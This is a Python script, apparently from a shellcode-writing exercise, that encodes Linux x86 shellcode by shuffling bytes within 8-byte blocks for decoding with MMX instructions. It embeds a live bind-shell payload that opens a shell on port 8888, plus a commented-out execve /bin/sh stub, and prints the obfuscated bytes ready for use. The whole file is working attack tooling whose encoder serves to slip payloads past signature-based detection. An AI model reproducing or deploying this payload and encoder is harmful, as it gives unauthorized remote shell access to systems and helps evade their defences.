#!/usr/bin/env python

# File: mmx-shuffle-encoder.py
# Author: Petr Javorik

# stack execve
#SHELLCODE = bytearray(
#    b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
#)

# bind 8888
SHELLCODE = bytearray(
    b'\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x5b\x31\xd2\x52\x66\x68\x22\xb8\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x50\x56\x89\xe1\x83\xc3\x02\xb0\x66\xcd\x80\x50\x50\x56\x89\xe1\x43\xb0\x66\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x41\xb0\x0b\xcd\x80'
)

# Align to qword multiples
missing_bytes = 8 - (len(SHELLCODE) % 8)
padding = [0x90 for _ in range(missing_bytes)]
SHELLCODE.extend(padding)

# Shuffle payload
shuffled_payload = []
# First byte carries count of needed PUNPCKLBW loops
loop_count = len(SHELLCODE)//8
shuffled_payload.append(loop_count)
for block_num in range(0, loop_count):
    current_block = SHELLCODE[(8 * block_num) : (8 * block_num + 8)]
    shuffled_block = [current_block[i] for i in [0, 2, 4, 6, 1, 3, 5, 7]]
    shuffled_payload.extend(shuffled_block)

# Remove trailing NOPS
for byte in shuffled_payload[::-1]:
    if byte == 0x90:
        del shuffled_payload[-1]
    else:
        break

# Print shellcode
print('Payload length: {}'.format(len(shuffled_payload)))
print('\\x' + '\\x'.join('{:02x}'.format(byte) for byte in shuffled_payload))
print('0x' + ',0x'.join('{:02x}'.format(byte) for byte in shuffled_payload))
